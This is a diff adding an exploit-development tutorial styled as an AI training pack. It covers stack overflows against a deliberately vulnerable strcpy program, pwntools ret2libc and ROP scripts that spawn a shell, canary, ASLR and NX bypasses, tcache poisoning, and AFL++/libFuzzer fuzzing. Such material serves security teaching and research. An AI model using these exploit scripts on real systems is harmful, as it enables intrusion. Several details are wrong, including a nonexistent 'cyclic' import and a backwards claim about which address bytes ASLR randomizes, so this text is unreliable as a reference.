@@ -1,0 +1,370 @@
+================================================================================
+TITAN AI — TRAINING PACK 023: EXPLOIT DEVELOPMENT AND VULNERABILITY RESEARCH
+BUFFER OVERFLOWS, HEAP EXPLOITATION, ROP CHAINS, KERNEL EXPLOITATION, FUZZING
+================================================================================
+
+================================================================================
+PART 1: EXPLOIT DEVELOPMENT FUNDAMENTALS
+================================================================================
+
+--- MEMORY LAYOUT ON x86/x64 ---
+
+PROCESS MEMORY MAP (from low to high addresses):
+  0x0000000000000000  — NULL (unmapped, catches null pointer dereferences)
+  [text segment]       — Executable code (.text), read-only
+  [data segment]       — Initialized globals (.data), read-write
+  [BSS segment]        — Uninitialized globals (.bss), zeroed at startup
+  [heap]               — Dynamic memory (malloc/new), grows upward
+  ...
+  [shared libraries]   — mmap'd .so/.dll files
+  ...
+  [stack]              — Function call frames, grows DOWNWARD
+  0xFFFFFFFFFFFFFFFF  — Kernel space (not accessible in user mode)
+
+STACK FRAME STRUCTURE:
+  High addresses (previous frames)
+  ┌─────────────────────┐
+  │ ... previous frame  │
+  ├─────────────────────┤  ← Previous RBP (saved frame pointer)
+  │ saved RBP           │  ← RBP points here
+  ├─────────────────────┤
+  │ return address (RIP)│  ← Where to jump after function returns
+  ├─────────────────────┤
+  │ local variables     │
+  │ char buffer[64]     │  ← RSP points toward here
+  └─────────────────────┘  (RSP = stack pointer, current top)
+  Low addresses (current frame)
+
+WHEN BUFFER OVERFLOW OCCURS:
+  char buffer[64] and you write 100 bytes:
+  Bytes 0-63: Fill buffer
+  Bytes 64-71: Overwrite saved RBP (on 64-bit, 8 bytes)
+  Bytes 72-79: Overwrite return address (RIP)
+  Bytes 80+: Overwrite whatever is above (caller's locals, etc.)
+  
+  At function return: CPU pops RIP from stack, jumps there.
+  Your controlled bytes at offset 72 = control execution flow.
+
+================================================================================
+PART 2: CLASSIC STACK BUFFER OVERFLOW
+================================================================================
+
+VULNERABLE CODE:
+  #include <stdio.h>
+  #include <string.h>
+  
+  void vulnerable(char *input) {
+      char buffer[64];
+      strcpy(buffer, input);  // No bounds check — classic overflow
+      printf("Input: %s\n", buffer);
+  }
+  
+  int main(int argc, char *argv[]) {
+      vulnerable(argv[1]);
+      return 0;
+  }
+
+EXPLOITATION STEPS:
+
+Step 1: Determine offset to return address
+  python3 -c "import cyclic; print(cyclic.cyclic(200))" > pattern.txt
+  ./vulnerable $(python3 -c "from pwn import *; print(cyclic(200).decode())")
+  # In GDB: When it crashes, note the value in RIP
+  # python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"  → offset = 72
+  
+  Manual: Buffer(64) + Saved RBP(8) + RIP(8) → offset to RIP = 72
+
+Step 2: Find exploit payload target
+  OPTION A: Jump to shellcode in buffer
+  OPTION B: Jump to existing gadget (ret2libc, ROP)
+  Modern systems: ASLR + NX prevent simple shellcode injection.
+  Use: ROP (Return-Oriented Programming) or ret2libc.
+
+Step 3: ret2libc (classic, works without NX bypass)
+  Instead of injecting shellcode: Jump to system() with "/bin/sh" argument.
+  
+  Need: Address of system(), address of "/bin/sh" string.
+  
+  # Find system() address (with ASLR disabled or info leak):
+  gdb vulnerable
+  (gdb) p system        → $1 = {<text variable, no debug info>} 0x7ffff7a52290 <system>
+  (gdb) find &system,+9999999,"/bin/sh"  → Found: 0x7ffff7b992ec
+  
+  # Build exploit:
+  from pwn import *
+  
+  offset = 72
+  system_addr = 0x7ffff7a52290
+  binsh_addr = 0x7ffff7b992ec
+  ret_gadget = 0x401016  # 'ret' instruction (needed for 16-byte stack alignment in x64)
+  pop_rdi = 0x401103     # 'pop rdi; ret' gadget (1st argument in x64 goes in RDI)
+  
+  payload = b'A' * offset
+  payload += p64(pop_rdi)    # Set RDI = "/bin/sh" address (first argument for system)
+  payload += p64(binsh_addr)
+  payload += p64(ret_gadget) # Align stack to 16 bytes (required for system() in glibc)
+  payload += p64(system_addr)# Call system("/bin/sh")
+  
+  p = process('./vulnerable')
+  p.sendline(payload)
+  p.interactive()
+
+================================================================================
+PART 3: MODERN MITIGATIONS AND BYPASSES
+================================================================================
+
+--- STACK CANARIES ---
+
+WHAT THEY ARE:
+  Random value placed between local variables and saved RBP/RIP.
+  Before function return: Check if canary is unchanged.
+  If changed: Stack smash detected → abort().
+  
+  Canary value: Random per-process (or per-thread). Changes each run.
+  Cannot brute-force: 64-bit systems = 64-bit canary (minus null byte = 7 bytes random).
+  
+BYPASS TECHNIQUES:
+  
+  1. Information leak: Find a vulnerability that leaks the canary value.
+     Formats string: printf(user_input) → %x.%x.%x reads stack values.
+     If canary is on stack and we can print stack values: Read it, use it in overflow.
+  
+  2. Overwrite only past canary: Some vulnerabilities let you skip to after the canary.
+     Off-by-one in loop indices, struct with heap pointer after canary.
+  
+  3. Brute force (32-bit only): 4-byte canary → 256 processes to try each byte.
+     Fork-based servers: Child processes inherit canary (same per-process value).
+     Brute-force byte by byte: 256 × 4 = 1024 attempts.
+
+--- ASLR (ADDRESS SPACE LAYOUT RANDOMIZATION) ---
+
+WHAT IT DOES:
+  Randomizes base addresses of stack, heap, libraries, executable (if PIE).
+  Each process run: Different addresses. Attacker can't hardcode jump targets.
+
+BYPASS TECHNIQUES:
+
+  1. Information leaks: Any vulnerability that prints memory addresses breaks ASLR.
+     Format string, use-after-free with pointer leak, heap overflow into printable area.
+     Once you have ONE address from a region: Calculate offsets to everything else.
+  
+  2. Partial overwrites: Only lowest bytes of return address randomized.
+     If 12 bits of randomization in low bytes: 4096 possibilities, brute-forceable.
+     Especially relevant for 32-bit targets.
+  
+  3. ASLR entropy gaps: Some systems have low entropy (8-bit = 256 positions).
+     Particularly: 32-bit Linux, some embedded systems.
+
+--- NX (NO-EXECUTE) / DEP (DATA EXECUTION PREVENTION) ---
+
+WHAT IT DOES:
+  Stack and heap marked non-executable.
+  Jump to shellcode in buffer → SIGSEGV (not code, CPU refuses to execute).
+
+BYPASS:
+  ROP (Return-Oriented Programming): Chain existing executable code (gadgets).
+  Gadgets: Short sequences ending in 'ret' instruction in legitimate code/libraries.
+  Chain: Set up stack so ret jumps to gadget1 → gadget1 returns → stack → gadget2...
+  Result: Complex computation using only existing executable bytes.
+
+--- FULL ROP CHAIN EXAMPLE ---
+
+FIND GADGETS:
+  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rdi ; ret"
+  → 0x0002155f: pop rdi ; ret
+  
+  ROPgadget --binary ./vulnerable | grep ": ret$"
+  → 0x0000000000401016: ret
+
+PWNTOOLS ROP AUTOMATION:
+  from pwn import *
+  
+  elf = ELF('./vulnerable')
+  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+  rop = ROP(elf)
+  
+  # With info leak: Get libc base
+  # (Imagine we leaked puts@got address, know puts@libc offset)
+  leaked_puts = 0x7f1234567890  # From info leak
+  libc_base = leaked_puts - libc.sym['puts']
+  libc.address = libc_base
+  
+  # Build ROP chain to call system("/bin/sh")
+  rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
+  
+  payload = b'A' * 72 + rop.chain()
+  
+  p = process('./vulnerable')
+  p.sendline(payload)
+  p.interactive()
+
+================================================================================
+PART 4: HEAP EXPLOITATION
+================================================================================
+
+--- MALLOC/FREE INTERNALS ---
+
+GLIBC MALLOC CHUNK STRUCTURE:
+  Each allocated chunk:
+  ┌──────────────────┐
+  │  prev_size       │  8 bytes (size of previous chunk if free)
+  │  size            │  8 bytes (size of this chunk + flags in low 3 bits)
+  ├──────────────────┤
+  │  user data       │  What malloc returns to user
+  │  ...             │
+  └──────────────────┘
+  
+  Free chunk (additional fields):
+  ┌──────────────────┐
+  │  prev_size       │
+  │  size            │
+  ├──────────────────┤
+  │  fd (forward)    │  Pointer to next free chunk in bin
+  │  bk (backward)   │  Pointer to previous free chunk in bin
+  │  ...             │
+  └──────────────────┘
+
+FREE LISTS (bins):
+  Fastbins: Small chunks (< 88 bytes). LIFO singly-linked list.
+  Unsorted bin: Recently freed chunks not yet sorted.
+  Small bins: Chunks 16-1024 bytes. Doubly-linked.
+  Large bins: Chunks > 1024 bytes.
+
+HEAP EXPLOIT TECHNIQUES:
+
+USE-AFTER-FREE (UAF):
+  Pattern: Allocate → Free → Use freed memory (dangling pointer).
+  
+  char *a = malloc(64);
+  free(a);
+  // a still points to freed memory
+  char *b = malloc(64);  // May reuse a's memory
+  strcpy(a, attacker_data);  // Writes into b's allocation
+  // If b contains function pointer or vtable: Control flow hijack
+  
+  Exploitation: UAF on vtable → overwrite with fake vtable → call virtual function.
+
+HEAP SPRAY:
+  Allocate many objects to predict heap layout.
+  Fill heap with NOP slide + shellcode (or ROP chain).
+  Jump anywhere in heap region → likely lands in shellcode.
+  Used against: Browser exploits, JIT-compiled objects.
+
+TCACHE (Thread Cache — glibc 2.26+) EXPLOITATION:
+  Each thread has tcache bins for small allocations (fast path).
+  tcache entries: Singly linked list (fd pointer only).
+  
+  Tcache poisoning:
+  // Allocate two chunks of same size
+  void *a = malloc(0x30);
+  void *b = malloc(0x30);
+  free(a);
+  free(b);
+  
+  // Write to freed b to overwrite fd pointer
+  // b->fd now points to target address
+  *(void **)b = target_address;
+  
+  // Next malloc of same size returns b, then returns target_address
+  malloc(0x30);   // Returns b (normal)
+  malloc(0x30);   // Returns target_address (controlled!)
+  
+  // Write anything at target_address: Function pointer, return address, etc.
+
+================================================================================
+PART 5: FUZZING FOR VULNERABILITY DISCOVERY
+================================================================================
+
+--- AFL++ (AMERICAN FUZZY LOP++) ---
+
+FUZZING PHILOSOPHY:
+  Throw massive amounts of mutated inputs at a program.
+  Track code coverage: When mutation reaches new code → keep it as seed.
+  Evolutionary algorithm: Build corpus of inputs that maximizes code coverage.
+  Coverage-guided fuzzing finds bugs humans would never think to trigger.
+
+AFL++ SETUP AND RUN:
+  # Compile with AFL++ instrumentation
+  export CC=afl-clang-fast
+  export CXX=afl-clang-fast++
+  ./configure && make
+  
+  # Or for pre-compiled binaries: QEMU mode (slower)
+  afl-fuzz -Q -i corpus/ -o findings/ -- ./target_binary @@
+  # @@ = AFL++ replaces with path to test case
+  
+  # Basic fuzzing run
+  mkdir corpus && echo "valid_seed_input" > corpus/seed01
+  afl-fuzz -i corpus -o findings -- ./vulnerable @@
+  
+  # Parallel fuzzing (use all cores):
+  # Master fuzzer:
+  afl-fuzz -i corpus -o findings -M fuzzer1 -- ./vulnerable @@
+  # Secondary fuzzers (each in separate terminal):
+  afl-fuzz -i corpus -o findings -S fuzzer2 -- ./vulnerable @@
+  afl-fuzz -i corpus -o findings -S fuzzer3 -- ./vulnerable @@
+  # ... up to N CPUs
+
+CRASH TRIAGE:
+  # When AFL++ finds crashes:
+  ls findings/default/crashes/
+  
+  # Reproduce each crash:
+  for crash in findings/default/crashes/id:*; do
+      echo "Testing: $crash"
+      ./vulnerable < "$crash" 2>&1 | head -5
+  done
+  
+  # Analyze with GDB:
+  gdb -q -x /dev/stdin ./vulnerable << 'EOF'
+  run < findings/default/crashes/id:000001,sig:11,...
+  bt full
+  info registers
+  x/20gx $rsp
+  EOF
+
+LIBFUZZER (for library/function-level fuzzing):
+  // Write a fuzz target:
+  #include <stdint.h>
+  #include <stdlib.h>
+  
+  // Function under test
+  int ParseInput(const uint8_t *data, size_t size);
+  
+  // Fuzz entry point (libFuzzer calls this with mutated inputs)
+  extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+      ParseInput(data, size);
+      return 0;  // Return 0 = no error (non-zero terminates fuzzer)
+  }
+  
+  // Compile:
+  clang -fsanitize=fuzzer,address -g target.cpp fuzz_target.cpp -o fuzzer
+  
+  // Run:
+  mkdir corpus && echo -n "initial_input" > corpus/seed
+  ./fuzzer corpus/ -max_len=1024 -jobs=8 -workers=8
+
+ADDRESS SANITIZER (find memory bugs during fuzzing):
+  Compile with: -fsanitize=address (ASan)
+  Detects: Buffer overflows, use-after-free, use-after-return, double-free
+  
+  Output on bug:
+  =================================================================
+  ==1234==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffff...
+  READ of size 1 at 0x7fffffff... thread T0
+      #0 0x401234 in vulnerable buffer_overflow.c:8
+      #1 0x401456 in main buffer_overflow.c:15
+  
+  Shadow bytes around the buggy address: [heap map shown]
+  
+  This output alone: You know exactly which line, which variable, what happened.
+  Without ASan: Segfault with no useful information.
+
+================================================================================
+END OF PACK 023: EXPLOIT DEVELOPMENT
+Total: Memory layout and stack frame structure, stack buffer overflow walkthrough
+(ret2libc, ROP chain setup), stack canary bypass techniques, ASLR bypass,
+NX/DEP bypass via ROP, heap internals (bins/chunks), UAF exploitation, tcache
+poisoning, AFL++ fuzzing setup and parallel execution, libFuzzer targets,
+crash triage workflow, Address Sanitizer for memory bug detection.
+================================================================================
